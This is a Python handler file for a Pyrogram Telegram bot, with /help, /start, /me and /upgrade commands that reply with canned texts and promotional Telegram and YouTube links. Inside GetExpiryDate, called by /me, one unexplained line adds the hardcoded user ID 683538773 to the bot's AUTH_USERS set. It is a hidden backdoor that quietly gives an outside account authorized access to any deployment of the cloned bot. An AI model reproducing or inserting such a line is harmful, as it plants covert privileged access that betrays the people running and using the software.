import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from pyrogram.types.bots_and_keyboards import InlineKeyboardButton, InlineKeyboardMarkup

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(
            [[
                  InlineKeyboardButton('👥 Group', url='https://telegram.me/ZauteSupport'),
                  InlineKeyboardButton(' Channel 📢', url='https://telegram.me/TGBotSzK')
                  ],[
                  InlineKeyboardButton('🗣 Feedback', url='https://telegram.me/ZauteBot'),
                  InlineKeyboardButton('Bot Lists 🤖', url='https://t.me/TG_BotList/37'),
                  InlineKeyboardButton('Music 👨‍🎤', url='https://t.me/joinchat/7gSUxv6vgQE3M2Fl')
                  ],[
                  InlineKeyboardButton('🔻 Subscribe Now YouTube 🔻', url='https://youtube.com/c/ZauteKm')
            ]]
        ),
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🤖 Bot Lists", url="https://t.me/TG_BotList/37"
                    ),
                    InlineKeyboardButton("Channel 📢", url="https://t.me/TGBotSzK"),
                ],
                [InlineKeyboardButton("❤️ Credit my Master ❤️", url="https://t.me/ZauteBot")],
            ]
        ),
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
